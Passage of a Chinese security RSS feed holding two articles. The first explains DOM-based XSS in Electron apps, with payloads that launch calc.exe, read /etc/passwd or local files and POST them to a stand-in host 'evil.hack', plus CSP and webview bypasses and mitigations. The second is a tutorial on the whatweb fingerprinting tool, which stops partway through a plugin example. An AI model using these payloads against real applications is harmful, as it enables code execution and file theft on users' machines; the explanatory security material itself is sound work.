发生的概率也会大大提高。 下面是两段 Electron 应用存在 DOM-Based XSS 的示例代码：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// Demo 1
fs.readFile( filename, (err,data) =&amp;gt; {
  if(!err) element.innerHTML = data; //XSS!
});

// Demo 2
fs.readdir( dirname, (err,files) =&amp;gt; {
  files.forEach( (filename) =&amp;gt; {
    let elm = document.createElement( &quot;div&quot; );
    elm.innerHTML = `&amp;lt;a href=&#39;${filename}&#39;&amp;gt;${filename}&amp;lt;/a&amp;gt;`; //XSS!
    paerntElm.appendChild( elm );
    });
});&lt;/code&gt;&lt;p&gt;对于 Electron 应用而言，一旦 DOM-Based XSS 发生将是灾难性的。 原因是：&lt;i&gt;Node.js 在很多情况下是可以被攻击者进行代码注入的！&lt;/i&gt; 除此之外，一般观念里的XSS = ALERT在这里是不适用的。&lt;/p&gt;&lt;p&gt;XSS 还有诸多玩法：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;读写本地文件&lt;/li&gt;&lt;li&gt;以任何协议进行通信&lt;/li&gt;&lt;li&gt;通过接口与其他进程通信&lt;/li&gt;&lt;li&gt;随意地启动其他程序（启动其他进程）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;也就是说，通过 DOM-Based XSS 可能被用于执行二进制代码。 在后文中，我们将详细地研究在 Electron 中的 DOM-Based XSS。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;与传统的 XSS 的不同之处&lt;/h2&gt;&lt;p&gt;现在我们进行一个对比， 对比传统的 Web 应用中的 XSS、浏览器沙盒中的 XSS 和 Electron 中的 XSS。&lt;/p&gt;&lt;p&gt;&lt;b&gt;传统的 Web 应用中的 XSS&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;显示虚假信息、泄露 Cookie、泄露网站内信息……&lt;/li&gt;&lt;li&gt;所有 JavaScript 在『在网站内』能做的事&lt;/li&gt;&lt;li&gt;除了『网站内』的，啥都不能做&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;被浏览器沙盒保护中的 XSS&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;即使存在 XSS，对除了 XSS 所在网站的其他站点没有影响&lt;/li&gt;&lt;li&gt;站点可以为自己存在的 XSS 承担责任，不影响其他人&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;在 Electron 中的 XSS&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;可以以当前用户权限启动任意代码&lt;/li&gt;&lt;li&gt;所有用户能做的事情，Electron 中的 XSS 都可以做&lt;/li&gt;&lt;li&gt;可以超过存在 XSS 的应用本身产生影响&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;深入分析 Electron 中的 DOM-Based XSS&lt;/h2&gt;&lt;p&gt;传统的 XSS 危害&lt;/p&gt;&lt;ul&gt;&lt;li&gt;弹窗（ALERT）&lt;/li&gt;&lt;li&gt;显示假消息（比如插入一个『请输入密码』的文本框）&lt;/li&gt;&lt;li&gt;打 Cookie（核心功能）&lt;/li&gt;&lt;li&gt;盗取敏感信息（读取密码框内容等）&lt;/li&gt;&lt;li&gt;其它……&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Electron 的 DOM-Based XSS 使任意代码执行变为可能。 这意味着，DOM-Based XSS 获得了如同缓冲区溢出的攻击效果。 &lt;/p&gt;&lt;p&gt;与传统的 DOM-Based XSS 相比，Electron 中的 DOM-Based：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;攻击向量选择更加多样，甚至可以与 HTTP 无关&lt;/li&gt;&lt;li&gt;HTML 生成数量少且不复杂，往往不会有非常多的依赖&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;因此，Electron 中的 DOM 操作必须更精细，严格转义是必要的。(&lt;i&gt;渲染进程中可以使用 Node 函数)&lt;/i&gt;&lt;/p&gt;&lt;p&gt;基于这个特性，攻击者可以在此之中插入 Node 函数用于攻击， 比如，这是一个普通的 XSS 实例：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// xss_source 是攻击者可以控制的字符串
elm.innerHTML = xss_source; // XSS!&lt;/code&gt;&lt;p&gt;攻击者可以以下面的方式利用：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;// 弹计算器
&amp;lt;img src=# onerror=&quot;require(&#39;child_process&#39;).exec(&#39;calc.exe&#39;,null);&quot;&amp;gt;
// 读取本地文件并发送
&amp;lt;img src=# onerror=&quot;let s = require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;);
fetch(&#39;http://evil.hack/&#39;, { method:&#39;POST&#39;, body:s });&quot;&amp;gt;&lt;/code&gt;&lt;p&gt;很多开发者使用 CSP 来限制 XSS 带来的影响， 那么这种方法是否适用于 Electron 的 DOM-Based XSS 呢？ 答案是否定的。下面我们将通过几个例子来讲解。&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;!-- 这是一个渲染器中的示例，可以看到 CSP 设置 --&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;none&#39;;
script-src &#39;self&#39;&quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;script src=&quot;./index.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;p&gt;在这种情况下，我们可以通过meta refresh来穿过 CSP：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// 这是 index.js 中的内容
elm.innerHTML = xss_source; // XSS!
// 这是我们对 xss_source 的控制
xss_source = &#39;&amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;http://evil.hack/&quot;&amp;gt;&#39;;
// 这是 evil.hack 中的&amp;lt;script&amp;gt;脚本内容
require(&#39;child_process&#39;).exec(&#39;calc.exe&#39;,null);&lt;/code&gt;&lt;p&gt;以上过程成功地弹出了计算器。也就是说，Node 语句依然有效。 下面，我们介绍另一种思路，依然是先看一个示例：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;!-- 这是一个渲染器中的示例，可以看到 CSP 设置 --&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;&quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;iframe id=&quot;iframe&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;script src=&quot;./index.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
// index.js
iframe.setAttribute(&quot;src&quot;, xss_source); // XSS!
// 这是 main.js 的节选
win = new BrowserWindow({width:600, height:400});
win.loadURL(`file://${__dirname}/index.html`);&lt;/code&gt;&lt;p&gt;在这种情况下，我们可以构建：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;xss_source = &#39;file://remote-server/share/trap.html&#39;;
// 下面是 trap.html 中的脚本
window.top.location=`data:text/html,&amp;lt;script&amp;gt;require(&#39;child_process&#39;).exec(&#39;calc.exe&#39;,null);&amp;lt;\/script&amp;gt;`;&lt;/code&gt;&lt;p&gt;此方法依然成功的绕过了 CSP 限制， 原因是在 main.js 中的 file:// 与 trap.html 中的 file:// 被认为是同源的。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;私有 API 与架构的安全风险&lt;/h2&gt;&lt;p&gt;接下来要内容是分析 Electron 自身带有的丰富的 API、函数和标签带来的安全问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;私有 API&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&amp;lt;webview&amp;gt;标签&lt;/li&gt;&lt;li&gt;shell.openExternal 等&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Electron 的架构问题&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;浏览器窗口默认支持加载file://&lt;/li&gt;&lt;li&gt;并没有与普通浏览器一般的地址栏&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;本地文件信息窃取&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们发现在默认情况下，Node 语句是可用的。 但是，如果开发者禁用了 Node 语句：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// main.js 节选
win = new BrowserWindow({ webPreferences:{nodeIntegration:false} });
win.loadURL(`file://${__dirname}/index.html`);&lt;/code&gt;&lt;p&gt;这种情况下，我们注入的 Node 语句不生效，可造成的威胁降低了。 看起来，在创建 BrowserWindow 的时候禁用 Node 语句是必要的。 但是，如果 Node 语句被禁用，Electron 会变得很鸡肋。&lt;/p&gt;&lt;p&gt;如果开发者执意禁止 Node 语句，我们依然不是无计可施的。 以刚刚的 main.js 为例，我们可以通过xhr来做更多的事情。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var xhr = new XMLHttpRequest();
xhr.open(&quot;GET&quot;, &quot;file://c:/file.txt&quot;, true);
xhr.onload = () =&amp;gt; {
  fetch(&quot;http://eveil.hack/&quot;,{method:&quot;POST&quot;, body:xhr.responseText});
};
xhr.send( null );&lt;/code&gt;&lt;p&gt;通过上面的代码，我们可以读取本地文件并将其发送出去。 这使得开发者在牺牲 Electron 的实用性禁用 Node 语句后， XSS 依旧十分强大。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;b&gt;iframe 沙盒&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;iframe 的沙盒可以用于限制 DOM 操作访问沙盒内部，从而降低 XSS 威胁性， 即使是 DOM-Based XSS 在 iframe 中发生，影响也十分有限。 比如如下的情况，在外部控制 iframe 是无效的。&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;iframe sandbox=&quot;allow-same-origin&quot; id=&quot;sb&quot;
srcdoc=&quot;&amp;lt;html&amp;gt;&amp;lt;div id=msg&amp;gt;&#39;test&#39;&amp;lt;/div&amp;gt;...&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;script&amp;gt;
  ...
  document.querySelector(&quot;#sb&quot;).contentDocument.querySelector(&quot;#msg&quot;).innerHTML =&quot;Hello, XSS!&amp;lt;script&amp;gt;alert(1)&amp;lt;\/script&amp;gt;&quot;; // not work
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;下面是一些常用的 sandbox params：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;allow-same-origin 允许作为包含文档的同源内容被处理&lt;/li&gt;&lt;li&gt;allow-scripts 允许执行脚本（危险！这意味着 JavaScript 将被正常执行）&lt;/li&gt;&lt;li&gt;allow-forms 允许提交表单&lt;/li&gt;&lt;li&gt;allow-top-navigation 允许内容被加载到顶层（危险！）&lt;/li&gt;&lt;li&gt;allow-popups 允许弹出窗口（危险！）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;下面是一个启用allow-popups的例子，以此来说明影响：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;iframe sandbox=&quot;allow-same-origin allow-popups&quot; id=&quot;sb&quot;
srcdoc=&quot;&amp;lt;html&amp;gt;&amp;lt;div id=msg&#39;&amp;gt;&amp;lt;/div&amp;gt;...&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;script&amp;gt;
...
  var xss = `&amp;lt;a target=&quot;_blank&quot; href=&quot;data:text/html,&amp;lt;script&amp;gt;require(&#39;child_process&#39;).exec(&#39;calc.exe&#39;,null);&amp;lt;\/script&amp;gt;&quot;&amp;gt;Click&amp;lt;/a&amp;gt;`;
  document.querySelector(&quot;#sb&quot;).contentDocument.querySelector(&quot;#msg&quot;).innerHTML = xss;
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;在这种情况下，用户一旦点击，就会弹出窗口。 根据默认可执行 Node 语句的特性，弹出计算器。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;b&gt;webview 标签的风险&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;webview 标签是用于在 Electron 中打开其它页面使用的。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;不同于 iframe，webview 没有访问 webview 外部途径&lt;/li&gt;&lt;li&gt;不同于 iframe，webview 同样不可以被外部操作 DOM&lt;/li&gt;&lt;li&gt;每一个 webview 都可以被单独地控制是否可以 Node 语句执行&lt;/li&gt;&lt;li&gt;通过allowpopups属性，webview 可以弹出窗口&lt;/li&gt;&lt;li&gt;可以使用window.open()、&amp;lt;a target=_blank&amp;gt;等语句打开新窗口&lt;/li&gt;&lt;li&gt;在 iframe 与 webview 中，对 Node 语句执行的控制是不同的&lt;/li&gt;&lt;li&gt;在 iframe 中，Node 语句一直被禁止执行，而弹出的窗口可以执行&lt;/li&gt;&lt;li&gt;在 webview 中，Node 语句默认被禁止执行，弹出的窗口同样被禁止&lt;/li&gt;&lt;li&gt;在 webview 中，Node 语句执行被设置为允许时，弹出的窗口是允许执行的&lt;/li&gt;&lt;li&gt;webview 即使禁止了 Node 语句执行，在preload脚本中的 Node 依然是可用的。&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;webview src=&quot;http://example.jp/&quot; preload=&quot;./prealod.js&quot;&amp;gt;&amp;lt;/webview&amp;gt;
//preload.js
window.loadConfig = function(){
  let file = `${__dirname}/config.json`;
  let s = require(&quot;fs&quot;).readFileSync( file, &quot;utf-8&quot; );
  return JSON.eval( s );
};&lt;/code&gt;&lt;p&gt;通常情况下，开发者会将存在的 Web App 变为一个 Native App, 然后，在 webview 中启动存在的 Web App. 在这里容易出现的问题是，开发者常常需要使用第三方服务接入此页面。&lt;/p&gt;&lt;p&gt;比如第三方广告、视频播放脚本等，它们具有完整能力。 比如执行任意的 JavaScript、构造假页面、污染页面等， 如果这个 webview 可以使用 Node，那就更有意思了。&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;body&amp;gt;
  &amp;lt;webview src=&quot;http://test.cn/&quot;&amp;gt;&amp;lt;/webview&amp;gt;
  &amp;lt;script src=&quot;native-apps.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;p&gt;通常的应对之策也易于理解：控制第三方内容的权限，比如通过 iframe 沙盒， 但这不适用于某些嵌入式 JavaScript 广告。 对于 Web App 来说，还有地址栏这个东西，可以让用户自己确认站点是否有效； &lt;/p&gt;&lt;p&gt;浏览器的存在和同源策略大大限制了其影响。 但对于 Electron 来说，没有地址栏，这带来了很大的风险。 更重要的是，一旦 Node 语句被允许执行，威胁能力将大大提高。&lt;/p&gt;&lt;p&gt;下面我们介绍如何利用存在allowpopups设置的 webview：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;webview src=&quot;http://test.cn/&quot; allowpopups&amp;gt;&amp;lt;/webview&amp;gt;&lt;/code&gt;&lt;p&gt;攻击主要原因是在 window.open 中，file:// 依然可用， 这使得攻击者在可以进行与前文类似的本地文件读取等操作。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// http://test.cn
window.open(&quot;file://remote-server/share/trap.html&quot;);
// trap.html
var xhr = new XMLHttpRequest();
xhr.open( &quot;GET&quot;, &quot;file://C:/secret.txt&quot;, true );&lt;/code&gt;&lt;p&gt;解决方案很简单：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;关掉allowpopups&lt;/li&gt;&lt;li&gt;如果一定要用，就在 main.js 中进行 url 合法性检查&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;i&gt;&lt;b&gt;shell.openExternal 与 shell.openItem 的风险&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;shell.openExternal 与 shell.openItem 是 Electron 用于打开外部程序的 API。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;const {shell} = require(&#39;electron&#39;);
const url = &#39;http://example.cn/&#39;;
shell.openExternal(url); // 打开系统默认浏览器
shell.openItem( url );

let file = &#39;C:/Users/test/test.txt&#39;;
shell.openExternal( file ); // 打开文件
shell.openItem( file );

let file = &#39;&#39;file://C:/Users/test/test.txt&#39;;&#39;;
shell.openExternal( file ); // 打开文件
shell.openItem( file );&lt;/code&gt;&lt;p&gt;常见的情况是 Electron 调用外部浏览器打开，如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;webview.on( &#39;new-window&#39;, (e) =&amp;gt; {
  shell.openExternal( e.url ); // 系统浏览器打开
});&lt;/code&gt;&lt;p&gt;此时，如何攻击者可以构造 URL 如下，则可以执行任意程序。 需要注意：此处不能传递参数。&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;a href=&quot;file://c:/windows/system32/calc.exe&quot;&amp;gt;Click&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;p&gt;应对之策也很简单，检查 URL 合法性即可（如匹配协议等）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;结论：&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Electron 存在 DOM-Based XSS 基本就是一死&lt;/li&gt;&lt;li&gt;Electron 随处可见的 Node 执行、外部脚本执行&lt;/li&gt;&lt;li&gt;即使外部脚本被禁了，还可以使用file://进行有效的攻击&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;参考：&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://utf-8.jp/cb2016/cb-hasegawa-en.pdf&quot;&gt;http://utf-8.jp/cb2016/cb-hasegawa-en.pdf&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-07-29-28186225</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>网站指纹识别 whatweb</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-07-21-28017554.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;网站指纹识别 whatweb&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28017554&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;前言&lt;/h2&gt;&lt;p&gt;Whatweb 是一个开源的网站指纹识别软件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。

&lt;/p&gt;&lt;p&gt;&lt;b&gt;它的一些特性&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;拥有超过1700+个插件&lt;/li&gt;&lt;li&gt;若网站返回302，会跳转到重定向的网站&lt;/li&gt;&lt;li&gt;可以根据服务器返回的响应头确定网站使用的服务器类型， web 中间件类型， cookie 信息&lt;/li&gt;&lt;li&gt;可以从网站的源代码中确定网站使用了哪些 JavaScript 库&lt;/li&gt;&lt;li&gt;可以通过页面 hash， path 等确定网站使用的cms版本。&lt;/li&gt;&lt;li&gt;查询网站 ip 及所属国家&lt;/li&gt;&lt;li&gt;多种日志格式： XML,JSON,MagicTree,
     RubyObject, MongoDB&lt;/li&gt;&lt;li&gt;可定制化 HTTP 头&lt;/li&gt;&lt;li&gt;可进行基础的认证设置&lt;/li&gt;&lt;li&gt;支持批量扫描网站
&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Whatweb 的安装&lt;/h2&gt;&lt;p&gt;Whatweb 是基于 ruby 语言开发，因此可以安装在具备 ruby 环境的系统中，目前支持 Windows/Mac OSX/Linux。&lt;/p&gt;&lt;p&gt;&lt;i&gt;注：kali Linux 下已经集成了此工具 &lt;/i&gt;&lt;/p&gt;&lt;p&gt;debian/ubuntu系统下:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;apt-get install whatweb //可自动解决依赖问题&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3b0a880b91f16dc75f2ea9923d902527.png_r.jpg&quot; data-rawwidth=&quot;729&quot; data-rawheight=&quot;275&quot;&gt;&lt;p&gt;redhat/centos 系统下:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;yum update
yum install ruby ruby-devel rubygems
wget http://www.morningstarsecurity.com/downloads/whatweb-0.4.7.tar.gz
tar xzvf whatweb-0.4.7.tar.gz
cd whatweb-0.4.7
./whatweb url&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;Whatweb 的使用&lt;/h2&gt;&lt;p&gt;我们以 &lt;a href=&quot;http://www.morningstarsecurity.com/&quot;&gt;www.morningstarsecurity.com&lt;/a&gt; 这个网站为例。&lt;/p&gt;&lt;p&gt;如果粗略的看一下网站的一些指纹信息，可以直接 whatweb 后边跟 url：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-2fff175ffb062463f96c7c5f8b647987.png_r.jpg&quot; data-rawwidth=&quot;797&quot; data-rawheight=&quot;182&quot;&gt;&lt;p&gt;如果查看详细信息，我们可以用-v参数：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;whatweb -v https://www.morningstarsecurity.com/&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7f9058a20064cd1568679df0c8ace663.jpg_r.jpg&quot; data-rawwidth=&quot;805&quot; data-rawheight=&quot;598&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-abe0317c3eee7375a5033275eb9ba6e3.jpg_r.jpg&quot; data-rawwidth=&quot;810&quot; data-rawheight=&quot;610&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e3a855f420c0ee20e36f474b2a33a028.jpg_r.jpg&quot; data-rawwidth=&quot;837&quot; data-rawheight=&quot;413&quot;&gt;&lt;p&gt;返回的信息比较全面。
&lt;/p&gt;&lt;p&gt;Whatweb 列出所有的插件：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;whatweb -l&lt;/code&gt;&lt;p&gt;whatweb 查看插件的具体信息：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;whatweb --info-plugins=&quot;插件名&quot;&lt;/code&gt;&lt;p&gt;若是批量扫描网站的指纹，这样的输出显然很不方便， whatweb  支持多种日志保存格式，可能将软件返回的结果保存在日志中注意查看。
&lt;/p&gt;&lt;p&gt;Whatweb 支持的日志格式如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;--log-brief=FILE    简要的记录，每个网站只记录一条返回信息

  --log-verbose=FILE    详细输出

  --log-xml=FILE    返回xml格式的日志

  --log-json=FILE    以json格式记录日志

  --log-json-verbose=FILE 记录详细的json日志

  --log-magictree=FILE    xml的树形结构

  --log-object=FILE    ruby对象格式

  --log-mongo-database    mongo数据库形式

  --log-mongo-collection Name of the MongoDB collection. Default: whatweb

  --log-mongo-host    MongoDB hostname or IP address. Default: 0.0.0.0

  --log-mongo-username    MongoDB username. Default: nil

  --log-mongo-password    MongoDB password. Default: nil

  --log-errors=FILE    Log errors&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们把结果以 xml 格式保存到日志：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;whatweb -v www.morningstarsecurity.com --log-xml=whatweb.xml&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-dcdc8cddaf07d1e6d9756e10725da04c.png_r.jpg&quot; data-rawwidth=&quot;722&quot; data-rawheight=&quot;524&quot;&gt;&lt;p&gt;注：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Json  格式需要安装  json 依赖  sudo gem install json&lt;/li&gt;&lt;li&gt;Mongo 格式需要安装 mongo 依赖  sudo gem install
mongo &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;它的高级用法&lt;/b&gt;&lt;/p&gt;&lt;p&gt;大家了解 sqlmap 的话应该知道 sqlmap 有个 level 等级，level 值越大测试的东西越多。同理，whatweb 也有个--aggression（简写为-a）参数，此参数后边可以跟数字1-4分别对应4个不同的等级。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Stealthy    每个目标发送一次 http 请求，并且会跟随重定向&lt;/li&gt;&lt;li&gt;Unused     //不可用。（从2011年开始，此参数就是在开发状态。）&lt;/li&gt;&lt;li&gt;Aggressive    每个目标发送少量的 http 请求，这些请求是根据参数为1时结果确定的&lt;/li&gt;&lt;li&gt;Heavy    每个目标会发送大量的 http 请求，会去尝试每一个插件
&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;当参数为3时：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c7be33ab2cc30f6395e4299c7fb8a02c.png_r.jpg&quot; data-rawwidth=&quot;746&quot; data-rawheight=&quot;416&quot;&gt;&lt;p&gt;可以看到，请求中多了一些 url。&lt;/p&gt;&lt;p&gt;另外，你想用它检测 xss？SQL 注入？rce？都是可以的，但是用起来没有其他软件方便，我们这里就不过多提及了，可以参考 &lt;a href=&quot;https://github.com/urbanadventurer/WhatWeb/wiki/Advanced-Usage#vulnerability-scanning&quot;&gt;urbanadventurer/WhatWeb&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;&lt;i&gt;注：默认参数为1。&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;编写 whatweb 插件
&lt;/h2&gt;&lt;p&gt;用过之后,大家可能会发现 whatweb 对国内的网站识别不是太好，我们可以自己写插件扩展 whatweb ，使之兼容国内的网站。
&lt;/p&gt;&lt;p&gt;我们先来看 whatweb 官方给的模板:&lt;/p&gt;&lt;code lang=&quot;rb&quot;&gt;Plugin.define &quot;Plugin-Template&quot; do
    author &quot;Enter Your Name&quot;
    version &quot;0.1&quot;
    description &quot;Describe what the plugin identifies. Include the homepage of the software package&quot;
    examples %w| include-some.net example-websites.com here.com |

    \# a comment block here is a good place to make notes for yourself and others 

    \# There are four types of matches: regexp, text, ghdb 
    \# Matches are enclosed in {} brackets and separated by commas 
    matches [
    {:name=&amp;gt;&quot;a brief description of the match, eg. powered by in footer&quot;,
    :certainty=&amp;gt;100, # 100 is certain, 75 is probably and 25 is maybe. if omitted, it defaults to 100. 
    :regexp=&amp;gt;/This page was generated by http://www.genericcms.com\/en\/products\/generic-cms\/&quot;&amp;gt;Generic CMS&amp;lt;\/a&amp;gt;/ },

    {:name=&amp;gt;&quot;title&quot;,
    :certainty=&amp;gt;75,
    :text=&amp;gt;&quot;&amp;lt;title&amp;gt;Generic Homepage&amp;lt;/title&amp;gt;&quot; }
    ]
    end&lt;/code&gt;&lt;p&gt;语法解释：
&lt;/p&gt;&lt;p&gt;第一行定义的为插件的名字，可以直接在命令行中使用。&lt;/p&gt;&lt;code lang=&quot;rb&quot;&gt;Plugin.define &quot;Drupal&quot; do 
&lt;/code&gt;&lt;p&gt;命令行可以这么测试&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;$ ./whatweb -p drupal www.example.com&lt;/code&gt;&lt;p&gt;第二行作者，第三行版本，第四行插件描述，第五行，插件所适用网站的例子
&lt;/p&gt;&lt;p&gt;第五行是一个 matchs 列表，也是 whatweb 的关键，里边定义了一些匹配规则
&lt;/p&gt;&lt;p&gt;{:name=&amp;gt;”meta
generator tag”, :  包含匹配的文件名称，这个文件必须是网站中唯一存在的文件。
&lt;/p&gt;&lt;p&gt;:regexp=&amp;gt; 是包含的要匹配的模式，它是一个正则表达式，可以有以下选项：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;:regexp标准的 ruby 正则表达式
:text 字符
:ghdb google hack 数据库，包含以下几个模式
inurl:包含的字符串在 url
intitle:包含的字符串在 title
filetype:包含的文件名，如 PDF, JPG, RB 等
:md5 请求页面的 md5 hash 值
:tagpattern html 标签
:version 可以设置正则表达式或直接字符串匹配
:string 可以设置正则表达式或直接字符串匹配
:filepath 可以设置正则表达式或直接字符串匹配，通常显示系统错误或配置文件等
:account 经常用在登陆页面或用户列表等
:module 可以设置正则表达式或直接字符串匹配，如网络设备可能使用了一个ruby 模块等
:model 可以设置正则表达式或直接字符串匹配
:firmware 可以设置正则表达式或直接字符串匹配，设备的固件版本&lt;/code&gt;&lt;p&gt;了解了以上选项我们可以写出一个简单的识别 dedecms 的插件，如下：&lt;/p&gt;&lt;code lang=&quot;rb&quot;&gt;Plugin.define &quot;DedeCMS&quot; do
author &quot;xxxxx&quot;
version &quot;0.1&quot;
description &quot;dedecms - homepage:http://www.dedecms.com/&quot;

# Examples # 
examples %w|
www.dedecms.com|

matches [

# Version detection # Powered by text 
{:name=&amp;gt;&quot;Powered by DedeCms&quot;,
:regexp=&amp;gt;/Powered by .*DedeCMS.*/}
]
